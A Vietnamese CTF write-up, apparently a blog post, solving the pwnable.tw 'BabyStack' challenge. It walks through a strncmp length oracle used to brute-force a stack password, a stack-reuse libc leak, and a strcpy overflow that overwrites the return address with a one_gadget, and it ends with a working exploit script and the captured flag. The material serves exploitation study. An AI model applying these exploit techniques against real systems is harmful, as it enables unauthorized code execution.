+++
title = 'Pwnable.tw - BabyStack'
date = 2026-09-19T23:27:50+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## BabyStack

`nc chall.pwnable.tw 10205`

Gợi ý của đề: *"Can you find the password in the stack?"*

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/BabyStack/babystack_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
```

"Canary found" ở đây là **báo nhầm** - `main` không hề load/store `fs:0x28`. `__stack_chk_fail` được import nhưng gọi thủ công khi `memcmp` chống sửa đổi thất bại.

libc đi kèm glibc 2.23. `main` (`0xecf`) `mmap(0x1000, RW)` một buffer trỏ bởi BSS `qword_202020`, đọc 16 bytes từ `/dev/urandom` vào buffer stack `buf` rồi copy sang buffer mmap - đó là password. Sau đó lặp menu 3 lựa chọn (`read(0, v8, 16)`):

- `'1'` → chưa login thì `sub_DEF(buf)`; đã login thì logout
- `'2'` → thoát vòng lặp; nếu đã login thì `memcmp(buf, *qword_202020, 0x10)`, bằng nhau thì `return`, không thì `__stack_chk_fail()`
- `'3'` → đã login thì `sub_E76(v6)` ("magic copy")

```c
int sub_DEF(const char *a1 /*=buf*/) {          // login
    char s[128];
    printf("Your passowrd :");
    sub_CA0(s, 127);                            // read(0,s,127)
    size_t v1 = strlen(s);
    if (strncmp(s, a1, v1)) return puts("Failed !");
    unk_202014 = 1; return puts("Login Success !");
}

int sub_E76(char *a1 /*=main v6*/) {            // magic copy
    char src[128];
    printf("Copy :");
    sub_CA0(src, 63);                           // read(0,src,63)
    strcpy(a1, src);                            // <- overflow
    return puts("It is magic copy !");
}
```

Frame của `main` đo trong gdb (PIE base lấy từ `info proc mappings`):

| ký hiệu | địa chỉ | offset từ `v6` |
|---|---|---|
| `v6` (đích magic copy) | `M-0x60` | `+0x00` |
| `buf` (password 16 byte) | `M-0x20` | `+0x40` |
| `v8` (input menu, 16 byte) | `M-0x10` | `+0x50` |
| saved rbp | `M` | `+0x60` |
| return address | `M+8` | `+0x68` |

#### Bug 1 - so sánh với độ dài do ta chọn

`strncmp(s, buf, strlen(s))` so sánh số byte **do kẻ tấn công quyết định**, không phải 16 cố định:

- Gửi `\x00` → `strlen(s) = 0` → `strncmp(..., 0) == 0` → **bypass login**
- Gửi `prefix_đã_biết + ứng_viên + \x00` → `strlen(s) = k+1` → so đúng `k+1` byte của `buf`; thấy "Login Success !" nghĩa là ứng viên bằng `buf[k]`

Đó là một **oracle so sánh từng byte** trên password nằm trên stack, và về sau là trên bất cứ thứ gì `strcpy` để lại sau `buf`. Không test được ứng viên `0` (NUL cắt `strlen` nên luôn báo đúng), nên gặp byte `0x00` thật là phải kết nối lại.

#### Bug 2 - `strcpy` tràn nhờ stack dùng lại

`src` trong `sub_E76` chỉ được đổ tối đa 63 bytes, nhưng nó nằm **cùng địa chỉ** với buffer `s` của login. Một lần login trước đó tới 127 bytes sẽ để lại byte của ta ở `src[63..126]`, và `strcpy(main_v6, src)` copy tới 127 bytes.

Hình học đo được: `dest = src + 0x90`, nên index nguồn `i` rơi vào offset `i` của `dest`; lần copy dừng ở byte NUL đầu tiên trong `src`. Tầm với tới `buf` (`+0x40`), saved rbp (`+0x60`) và return address (`+0x68`).

### 2. Khai thác

#### Bước 1 - lấy password bằng oracle

Lặp login trong cùng một process (bấm `'1'` khi đang login là logout, bấm `'1'` nữa là login lại). Với mỗi vị trí `k` thử ứng viên `1..255`, cái nào in "Login Success !" thì đó là `buf[k]`.

#### Bước 2 - leak libc nhờ stack dùng lại

Chuỗi: `login('C'*72)` → `login('\x00')` → `copy('CCCC')`.

Lần login 72 byte đổ đầy `src[0..71]`; `src[0x48]` giữ lại một con trỏ **libc** còn sót từ lần gọi libc trước, và `strcpy` ghi nó vào `buf+8`:

```js
src+0x40 = 0x4343434343434343        (8 * 'C')
src+0x48 = 0x00007ffff7878439        <- libc + 0x78439
```

`strcpy` dừng ở byte 0 cao của con trỏ, nên oracle đọc được 14 byte: `buf[0..7] = 'C'*8`, `buf[8..13]` là 6 byte thấp của con trỏ libc:

```py
libc_base = u64(leak[8:14] + b"\0\0") - 0x78439
```

#### Bước 3 - ghi đè return address bằng one_gadget

`main` set giá trị trả về bằng 0 (`mov eax,0`) ngay trước `leave; ret`, nên one_gadget `libc+0x45216` (ràng buộc `rax == NULL`) dùng được thẳng làm một qword return duy nhất.

Payload login 127 byte `P` (rồi `login('\x00')`, rồi `copy('AAA')`):

```js
P[0x00..0x3f] filler không NUL ('A')
P[0x40..0x4f] password thật       -> dest buf      (memcmp qua)
P[0x50..0x5f] filler không NUL
P[0x60..0x67] rác không NUL        -> saved rbp
P[0x68..0x6d] p64(one)[:6]         -> return address của main
P[0x6e]       = 0x00               -> strcpy dừng ngay sau ret
```

`login('\x00')` ghi `s[0] = 0` nhưng `copy('AAA')` sau đó ghi lại `src[0..2]`, nên lần copy không bị dừng sớm. Bấm `'2'` thì `memcmp` qua và return vào gadget.

```bash
[+] password = c43eb40710e78c2f163a75c5d4b1ded9
[+] libc base = 0x7f882c82c000
[+] one_gadget = 0x7f882c871216
FLAG{Its_juS7_a_st4ck0v3rfl0w}
uid=1000(babystack) gid=1000(babystack)
```

`FLAG: FLAG{Its_juS7_a_st4ck0v3rfl0w}`

```py
LIBC_LEAK_OFF = 0x78439
ONE_SHOT      = 0x45216
MENU_FILL     = b'B'*15

class App:
    def login(self, pwd):                 # menu read bị chặn 16 byte -> pipeline
        payload = b''
        if self.auth: payload += b'1'+MENU_FILL; self.auth = False
        payload += b'1'+MENU_FILL+pwd
        self.p.send(payload)
        ok = b'Login Success' in self.p.recvuntil(b'!\n')
        self.auth = ok
        return ok
    def copy(self, data):
        self.p.send(b'3'+MENU_FILL+data); self.p.recvuntil(b'It is magic copy !\n')
    def exit_app(self):
        self.p.send(b'2'+MENU_FILL)

def recover(app, n, seed=b''):
    data = bytearray(seed)
    while len(data) < n:
        for i in range(1, 256):
            if app.login(bytes(data)+bytes([i])+b'\x00'):
                data.append(i); break
        else: break
    return bytes(data)

pw = recover(app, 16)                                       # bước 1
app.login(b'C'*72); app.login(b'\x00'); app.copy(b'CCCC')   # bước 2
libc_base = u64(recover(app, 14, b'C'*8)[8:14]+b'\x00'*2) - LIBC_LEAK_OFF
one = libc_base + ONE_SHOT
P = bytearray(b'A'*127)
P[0x40:0x50] = pw; P[0x50:0x60] = b'B'*16; P[0x60:0x68] = b'D'*8
P[0x68:0x6e] = p64(one)[:6]; P[0x6e] = 0
app.login(bytes(P)); app.login(b'\x00'); app.copy(b'AAA'); app.exit_app()  # bước 3
```
